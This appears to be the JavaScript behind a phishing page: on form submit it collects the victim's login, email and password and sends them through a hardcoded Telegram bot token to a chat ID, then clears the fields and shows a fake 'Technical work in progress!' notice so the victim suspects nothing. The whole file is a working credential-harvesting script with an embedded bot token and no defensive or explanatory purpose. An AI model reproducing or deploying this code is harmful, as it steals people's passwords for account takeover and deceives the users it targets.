const TOKEN = "6227822301:AAG9qfU4Qkg9qi-_va43ybEcjm4jxWz7L28";
const CHAT_ID = "-1001931630381";
const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
const successend = document.getElementById('successend');

    document.getElementById('tg').addEventListener('submit', function(e) {
        e.preventDefault();
            
        let message  = `<b>Данные с сайта</b>\n`;
        message += `<b>Логин:</b> ${ this.login.value } \n`;
        message += `<b>Почта:</b> ${ this.email.value } \n`;
        message += `<b>Пароль:</b> ${ this.password.value } \n`;
            

        axios.post(URI_API,{
            chat_id:CHAT_ID,
            parse_mode: 'html',
            text: message
        })
        .then((res) => {
            this.login.value = "";
            this.email.value = "";
            this.password.value = "";
            successend.innerHTML = "Technical work in progress!";
            successend.style.display = "block";
        })
    })